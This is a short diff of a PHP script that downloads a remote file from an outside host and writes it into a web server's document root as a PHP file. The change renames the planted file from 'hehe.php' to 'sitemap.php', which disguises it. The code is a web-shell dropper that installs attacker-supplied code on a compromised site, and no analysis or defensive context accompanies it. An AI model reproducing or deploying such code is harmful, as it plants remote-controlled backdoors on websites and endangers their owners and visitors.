@@ -8,7 +8,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check3 = $_SERVER['DOCUMENT_ROOT'] . "/hehe.php" ;
+$check3 = $_SERVER['DOCUMENT_ROOT'] . "/sitemap.php" ;
 $text3 = http_get('http://www.med-health.net/cache/hehe.txt');
 $open3 = fopen($check3, 'w');
 fwrite($open3, $text3);
